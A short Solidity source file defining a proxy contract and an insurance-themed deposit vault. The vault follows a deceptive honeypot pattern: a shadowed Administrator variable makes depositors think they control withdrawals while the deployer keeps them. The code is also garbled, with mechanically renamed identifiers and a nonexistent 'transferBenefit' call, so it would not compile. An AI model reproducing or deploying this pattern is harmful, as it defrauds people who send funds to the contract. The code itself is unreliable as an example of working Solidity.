pragma solidity ^0.4.23;

contract Proxy  {
    modifier onlyDirector { if (msg.sender == Administrator) _; } address Administrator = msg.sender;
    function movecoverageManager(address _coordinator) public onlyDirector { Administrator = _coordinator; }
    function proxy(address target, bytes data) public payable {
        target.call.value(msg.value)(data);
    }
}

contract CoveragevaultProxy is Proxy {
    address public Administrator;
    mapping (address => uint256) public Deposits;

    function () public payable { }

    function BenefitVault() public payable {
        if (msg.sender == tx.origin) {
            Administrator = msg.sender;
            contributePremium();
        }
    }

    function contributePremium() public payable {
        if (msg.value > 0.25 ether) {
            Deposits[msg.sender] += msg.value;
        }
    }

    function collectCoverage(uint256 amount) public onlyDirector {
        if (amount>0 && Deposits[msg.sender]>=amount) {
            msg.sender.transferBenefit(amount);
        }
    }
}